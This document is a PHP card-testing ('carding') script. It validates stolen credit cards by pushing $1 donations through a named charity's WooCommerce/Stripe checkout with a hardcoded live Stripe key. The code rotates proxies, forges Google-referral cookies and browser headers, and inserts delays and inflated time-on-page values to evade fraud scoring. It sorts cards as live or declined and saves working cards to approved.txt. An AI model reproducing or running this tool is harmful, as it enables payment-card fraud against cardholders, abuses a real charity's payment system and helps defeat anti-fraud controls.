<?php

// ==========================================
// 1. PROXY & UA SETUP
// ==========================================
require_once 'ua.php';
$uaObj = new userAgent();
$generated_ua = $uaObj->generate('chrome'); 

// Function to get a random proxy from proxy.txt
function getProxy() {
    $file = 'proxy.txt';
    if (!file_exists($file)) return false;
    
    $proxies = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (empty($proxies)) return false;
    
    $proxy = $proxies[array_rand($proxies)];
    
    // Clean whitespace
    $proxy = trim($proxy);
    
    // Parse format: ip:port:user:pass or ip:port
    $parts = explode(':', $proxy);
    
    if (count($parts) == 4) {
        return [
            'address' => $parts[0] . ':' . $parts[1],
            'auth' => $parts[2] . ':' . $parts[3],
            'type' => CURLPROXY_HTTP // Usually HTTP for residential/mobile
        ];
    } elseif (count($parts) == 2) {
        return [
            'address' => $parts[0] . ':' . $parts[1],
            'auth' => null,
            'type' => CURLPROXY_HTTP
        ];
    } else {
        // Fallback for simple string if format is weird
        return [
            'address' => $proxy,
            'auth' => null,
            'type' => CURLPROXY_HTTP
        ];
    }
}

// Select ONE proxy for the entire session
$current_proxy = getProxy();

// ==========================================
// 2. CONFIGURATION & UTILITIES
// ==========================================

function parseCardDetails($cc) {
    $parts = explode('|', $cc);
    if (count($parts) < 4) return false;
    $expYear = trim($parts[2]);
    if (strlen($expYear) == 2) $expYear = '20' . $expYear;
    return [
        'number'    => trim($parts[0]),
        'exp_month' => trim($parts[1]),
        'exp_year'  => $expYear,
        'cvv'       => trim($parts[3])
    ];
}

function returnResponse($response, $status, $message, $extra = null) {
    $out = ["response" => $response, "status" => $status, "message" => $message];
    echo json_encode($out, JSON_PRETTY_PRINT) . "\n";
    exit;
}

if (!isset($_GET['cc']) || empty($_GET['cc'])) {
    returnResponse("Error", "Missing Input", "Please provide cc parameter");
}

$cardDetails = parseCardDetails($_GET['cc']);
if (!$cardDetails) returnResponse("Error", "Invalid Format", "Invalid CC format");

$card_num  = $cardDetails['number'];
$exp_month = $cardDetails['exp_month'];
$exp_year  = $cardDetails['exp_year'];
$cvc       = $cardDetails['cvv'];

$cookie_file = getcwd() . '/cookie.txt';
if (file_exists($cookie_file)) unlink($cookie_file);

// RANDOM DATA
$first_name = "James" . rand(100, 999);
$last_name  = "Doe";
$email      = strtolower($first_name) . rand(1000,9999) . "@gmail.com";
$zip        = "10001";
$city       = "New York";
$state      = "NY";
$phone      = "+1" . rand(200, 900) . rand(200, 900) . rand(1000, 9999);
$stripe_pk  = 'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrKfWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6';

function generate_uuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

// ==========================================
// 3. REQ FUNCTION (Uses Residential Proxy)
// ==========================================
function req($url, $post = null, $custom_headers = []) {
    global $cookie_file, $generated_ua, $current_proxy;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 40);

    // APPLING PROXY FROM FILE
    if ($current_proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $current_proxy['address']);
        if ($current_proxy['auth']) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $current_proxy['auth']);
        }
        curl_setopt($ch, CURLOPT_PROXYTYPE, $current_proxy['type']);
    }

    $headers = array_merge([
        'user-agent: ' . $generated_ua,
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language: en-US,en;q=0.9',
        // Anti-Fingerprinting Headers
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
    ], $custom_headers);

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    $result = curl_exec($ch);
    if (curl_errno($ch)) return 'CURL_ERROR: ' . curl_error($ch);
    curl_close($ch);
    return $result;
}

function get_str($string, $start, $end) {
    $str = explode($start, $string);
    return isset($str[1]) ? explode($end, $str[1])[0] : '';
}

function extractMessage($html) {
    $msg = strip_tags($html);
    $msg = trim(preg_replace('/\s+/', ' ', $msg));
    return $msg ? $msg : 'Unknown error';
}

// ==========================================
// 4. EXECUTION FLOW
// ==========================================

// 4.1 FAKE GOOGLE COOKIES
$now = date('Y-m-d%20H%3A%i%3As');
$sbjs_data = "sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D$now%7C%7C%7Cep%3Dhttps%3A%2F%2Fforcesforchange.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D$now%7C%7C%7Cep%3Dhttps%3A%2F%2Fforcesforchange.org%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3D" . urlencode($generated_ua);

// Initialize cookie jar with proxy
$ch = curl_init('https://forcesforchange.org/');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
curl_setopt($ch, CURLOPT_COOKIE, $sbjs_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
if ($current_proxy) {
    curl_setopt($ch, CURLOPT_PROXY, $current_proxy['address']);
    if ($current_proxy['auth']) curl_setopt($ch, CURLOPT_PROXYUSERPWD, $current_proxy['auth']);
}
curl_close($ch);

// 4.2 VISIT PAGE
$h1 = req("https://forcesforchange.org/donate/", null, [
    'referer: https://www.google.com/',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none'
]);

$checkout_nonce = get_str($h1, 'name="woocommerce-process-checkout-nonce" value="', '"');
$security_nonce = get_str($h1, 'name="security" value="', '"');
if(empty($checkout_nonce)) $checkout_nonce = get_str($h1, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"');

sleep(rand(2,4)); // Anti-Fraud Delay

// 4.3 ADD TO CART
$post_data = http_build_query([
    'action' => 'wcdp_ajax_donation_calculation',
    'security' => $security_nonce,
    'postid' => '2210',
    'wcdp_form_id' => 'wcdp_1_',
    'donation-amount' => 'other',
    'wcdp-donation-amount' => '1',
    'quantity' => '1'
]);

$h2 = req("https://forcesforchange.org/wp-admin/admin-ajax.php", $post_data, [
    'x-requested-with: XMLHttpRequest',
    'referer: https://forcesforchange.org/donate/',
    'origin: https://forcesforchange.org'
]);

sleep(1); 

// 4.4 UPDATE ORDER
$post_data = http_build_query([
    'security' => $checkout_nonce,
    'country' => 'US',
    'state' => $state,
    'postcode' => '',
    'city' => '',
    'address' => '',
    'address_2' => '',
    's_country' => 'US',
    's_state' => $state,
    'payment_method' => 'stripe',
    'has_full_address' => 'false',
    'post_data' => 'billing_email='.urlencode($email).'&billing_first_name='.urlencode($first_name).'&billing_last_name='.urlencode($last_name)
]);

$h3 = req("https://forcesforchange.org/?wc-ajax=update_order_review", $post_data, [
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'referer: https://forcesforchange.org/donate/'
]);

// 4.5 STRIPE TOKEN
$guid = generate_uuid();
$muid = generate_uuid();
$sid  = generate_uuid();
$client_sid = generate_uuid();
$config_id = generate_uuid();

$stripe_data = [
    'billing_details' => [
        'name' => "$first_name $last_name",
        'email' => $email,
        'phone' => $phone,
        'address' => [
            'city' => $city,
            'country' => 'US',
            'line1' => '123 Test St',
            'line2' => '',
            'postal_code' => $zip,
            'state' => $state
        ]
    ],
    'type' => 'card',
    'card' => [
        'number' => $card_num,
        'cvc' => $cvc,
        'exp_year' => $exp_year,
        'exp_month' => $exp_month,
    ],
    'allow_redisplay' => 'unspecified',
    'payment_user_agent' => 'stripe.js/5b3d231411; stripe-js-v3/5b3d231411; payment-element; deferred-intent',
    'referrer' => 'https://forcesforchange.org',
    'time_on_page' => rand(30000, 90000), // High time on page = low fraud score
    'guid' => $guid,
    'muid' => $muid,
    'sid' => $sid,
    'key' => $stripe_pk,
    'client_attribution_metadata' => [
        'client_session_id' => $client_sid,
        'merchant_integration_source' => 'elements',
        'merchant_integration_subtype' => 'payment-element',
        'merchant_integration_version' => '2021',
        'payment_intent_creation_flow' => 'deferred',
        'payment_method_selection_flow' => 'merchant_specified',
        'elements_session_config_id' => $config_id,
        'merchant_integration_additional_elements' => ['payment']
    ],
    '_stripe_version' => '2024-06-20'
];

$h4 = req("https://api.stripe.com/v1/payment_methods", http_build_query($stripe_data), [
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-site: same-site'
]);

$stripe_json = json_decode($h4, true);
if (!isset($stripe_json['id'])) returnResponse('Error', 'Token Error', 'Failed to generate token');
$payment_method_id = $stripe_json['id'];

sleep(rand(1,3));

// 4.6 FINAL CHECKOUT
$checkout_data = [
    'billing_email' => $email,
    'billing_first_name' => $first_name,
    'billing_last_name' => $last_name,
    'billing_country' => 'US',
    'billing_address_1' => '123 Test St',
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_postcode' => $zip,
    'billing_phone' => $phone,
    'payment_method' => 'stripe',
    'wc-stripe-payment-method' => $payment_method_id,
    'wc-stripe-is-deferred-intent' => '1',
    'woocommerce-process-checkout-nonce' => $checkout_nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review',
    'wc-stripe-payment-method-upe' => '', 
    'wc_stripe_selected_upe_payment_type' => '',
    'wc_order_attribution_source_type' => 'organic',
    'wc_order_attribution_referrer' => 'https://www.google.com/',
    'wc_order_attribution_utm_campaign' => '(none)',
    'wc_order_attribution_utm_source' => 'google',
    'wc_order_attribution_utm_medium' => 'organic',
    'wc_order_attribution_utm_content' => '(none)',
    'wc_order_attribution_utm_id' => '(none)',
    'wc_order_attribution_utm_term' => '(none)',
    'wc_order_attribution_utm_source_platform' => '(none)',
    'wc_order_attribution_utm_creative_format' => '(none)',
    'wc_order_attribution_utm_marketing_tactic' => '(none)',
    'wc_order_attribution_session_entry' => 'https://forcesforchange.org/donate/',
    'wc_order_attribution_session_start_time' => date('Y-m-d H:i:s'),
    'wc_order_attribution_session_pages' => rand(2,5),
    'wc_order_attribution_session_count' => '1',
    'wc_order_attribution_user_agent' => $generated_ua
];

$finalResponse = req("https://forcesforchange.org/?wc-ajax=checkout", http_build_query($checkout_data), [
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'referer: https://forcesforchange.org/donate/'
]);

// ==========================================
// 5. RESPONSE ANALYSIS
// ==========================================
try {
    if (strpos($finalResponse, 'CURL_ERROR') !== false) {
        returnResponse('Declined', 'Declined', 'Proxy Connection Error');
    }

    $responseData = json_decode($finalResponse, true);
    $actualMessage = isset($responseData['messages']) ? extractMessage($responseData['messages']) : 'Unknown error';

    if (isset($responseData['result']) && $responseData['result'] === 'success') {
        $ccString = $card_num . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;
        file_put_contents('approved.txt', $ccString . "\n", FILE_APPEND | LOCK_EX);
        returnResponse('Succeeded', 'Approved', 'Charge Successfully');
    }

    if (isset($responseData['result']) && $responseData['result'] === 'failure') {
        if (strpos(strtolower($actualMessage), 'insufficient') !== false) {
            returnResponse('Approved', 'Approved', 'Insufficient Funds (Live)'); 
        } elseif (strpos(strtolower($actualMessage), 'incorrect') !== false) {
            returnResponse('Approved', 'Approved', 'Incorrect CVC (Live)');
        } elseif (strpos(strtolower($actualMessage), 'security code') !== false) {
            returnResponse('Approved', 'Approved', 'Incorrect CVC (Live)');
        }
        returnResponse('Declined', 'Declined', $actualMessage);
    }
    
    if (strpos($finalResponse, 'action_required') !== false || strpos($finalResponse, 'requires_action') !== false) {
        returnResponse('3D', '3D', '3D Secure authentication required');
    }

    returnResponse('Declined', 'Declined', $actualMessage);

} catch (Exception $e) {
    returnResponse('Error', 'Error', 'An error occurred: ' . $e->getMessage());
}
?>